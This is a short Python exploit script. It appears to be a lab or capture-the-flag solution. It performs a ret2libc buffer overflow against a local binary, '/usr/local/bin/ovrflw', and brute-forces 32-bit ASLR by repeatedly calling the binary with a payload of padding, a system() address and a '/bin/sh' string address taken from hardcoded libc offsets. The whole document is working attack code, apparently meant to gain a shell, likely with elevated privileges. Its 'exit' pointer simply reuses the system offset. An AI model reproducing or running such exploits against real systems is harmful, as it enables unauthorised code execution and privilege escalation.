import os
import sys
import struct
from subprocess import call

BUFFER = 112

junk = b"\x41" * BUFFER

### Platform Dependent Vars ###
libc    = 0xf7dbf000
sys_off = 0x03e9e0
bin_off = 0x17eaaa
###############################

# Attempts to brute force ALSR. This is posssible due to only 3 bytes changing
# in a 32-bit binary
for i in range(512):

    # print(f"Round: {i}\r", end='')

    # Addresses
    sys_ptr = struct.pack("<I", libc + sys_off)
    bin_ptr = struct.pack("<I", libc + bin_off)
    exit_ptr = struct.pack("<I", libc + sys_off)

    payload = b""
    payload += junk
    payload += sys_ptr
    payload += exit_ptr
    payload += bin_ptr

    ret = call(["/usr/local/bin/ovrflw", payload])
